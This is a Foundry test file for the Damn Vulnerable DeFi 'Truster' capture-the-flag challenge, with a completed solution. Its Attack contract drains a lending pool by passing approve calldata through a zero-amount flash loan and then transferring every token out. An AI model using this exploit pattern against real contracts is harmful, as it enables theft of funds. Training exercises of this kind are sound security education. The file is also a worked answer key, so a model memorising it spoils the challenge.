// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Deploy the attack contract
        Attack attackContract = new Attack(pool, token, player, recovery);

        // Execute the attack
        attackContract.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

contract Attack {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public player;
    address public recovery;

    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address _player,
        address _recovery
    ) {
        pool = _pool;
        token = _token;
        player = _player;
        recovery = _recovery;
    }

    function attack() external {
        // Crafting the payload to approve the player to spend the pool's tokens
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            1_000_000e18
        );

        // Taking a flash loan of 0 tokens to execute the approve function
        pool.flashLoan(0, address(this), address(pool.token()), data);

        // Now that the player is approved, transfer all tokens from the pool to the recovery account
        token.transferFrom(address(pool), address(this), 1_000_000e18);

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
